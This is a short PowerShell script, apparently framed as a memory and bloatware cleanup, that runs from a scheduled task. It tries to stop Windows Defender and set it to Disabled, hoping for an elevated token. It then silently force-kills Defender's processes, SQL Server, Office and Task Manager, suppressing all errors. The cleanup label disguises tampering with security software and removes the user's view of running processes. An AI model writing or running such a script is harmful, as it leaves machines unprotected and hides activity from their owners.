# This script runs via existing scheduled task
# Try to disable Defender via CIM (might work if task has elevated token)
try {
    $svc = Get-CimInstance Win32_Service -Filter "Name='WinDefend'" -ErrorAction Stop
    Invoke-CimMethod -InputObject $svc -MethodName StopService -ErrorAction Stop | Out-Null
    Invoke-CimMethod -InputObject $svc -MethodName ChangeStartMode -Arguments @{StartMode="Disabled"} -ErrorAction Stop | Out-Null
} catch {}

# Kill all bloatware
$kills = @('MsMpEng','MpDefenderCoreService','SysInfoCap','AppHelperCap','NetworkCap','DiagsCap','HPCommRecovery','sqlservr','OfficeClickToRun','SearchHost','msedgewebview2','Widgets','ms-teams','wps','Taskmgr')
foreach($p in $kills) { 
    Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# Empty working sets
Add-Type -MemberDefinition '[DllImport("psapi.dll")] public static extern int EmptyWorkingSet(IntPtr hw);' -Name "psapi" -Namespace "win32" -PassThru
Get-Process | ForEach-Object { try { [win32.psapi]::EmptyWorkingSet($_.Handle) } catch {} }
